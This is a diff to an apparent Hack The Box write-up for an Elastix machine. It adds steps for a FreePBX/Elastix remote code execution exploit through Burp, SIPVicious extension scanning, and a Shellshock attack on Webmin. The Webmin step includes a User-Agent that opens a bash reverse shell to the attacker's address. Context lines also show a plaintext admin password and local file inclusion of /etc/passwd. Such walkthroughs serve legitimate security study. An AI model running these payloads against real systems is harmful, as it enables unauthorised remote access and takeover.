@@ -102,7 +102,7 @@ ARI_ADMIN_USERNAME=admin
 ARI_ADMIN_PASSWORD=jEhdIekWmdjE
 ```
 
-With a _Local File Inclusion_ we can search for an file on the server like /etc/passwd to see the users on the server. The interesting users on this box are:
+With a _Local File Inclusion_ we can search for any file on the server like /etc/passwd to see the users on the server. The interesting users on this box are:
 - root
 - mysql
 - cyrus
@@ -175,5 +175,53 @@ It only shows a blank line but still accepts commands and we can verify that we 
 
 ### Remote Code Execution
 
+If we look for vulnerabilities in Elastix again there is **FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution** which we will use. This script will fail because of the SSL certificate so we run this through a proxy in Burpsuite.
 
+**Burpsuite**:
+Proxy --> Options --> Add Proxy Listener
+- Bind to port: 80
+- Bind to address: Loopback only
+- Redirect to host: 10.10.10.7
+- Redirect to port: 443
+- Force use of SSL
 
+We need to change the parameters to our needs:
+```markdown
+rhost="localhost"
+lhost="10.10.14.13"
+lport=443
+extension="233"
+```
+
+The valid extension can be found with the tools from **SIPVicious**:
+```markdown
+svmap 10.10.10.7
+
+svwar -m INVITE -e200-250 10.10.10.7
+```
+
+Running the script will give us a shell with the user _asterisk_.
+
+## Method 4
+
+### Shellshock on Webmin (Port 10000)
+
+On port 10000 it runs a webmin appliance that is vulnerable to **Shellshock**.
+By intruding the request with Burpsuite and changing the _User-Agent_ to the Shellshock string we can exploit this box.
+```markdown
+GET / HTTP/1.1
+Host: 10.10.10.7:10000
+**User-Agent: () { :; }; sleep 10**
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+(...)
+```
+
+With the `sleep 10` command we verify that code execution is possible by waiting 10 seconds for the server to respond.
+Now we can put a reverse shell in there:
+```markdown
+User-Agent: () { :; }; bash -i >& /dev/tcp/10.10.14.13/9001 0>&1
+```
+
+Our listener starts a reverse shell with the user root!
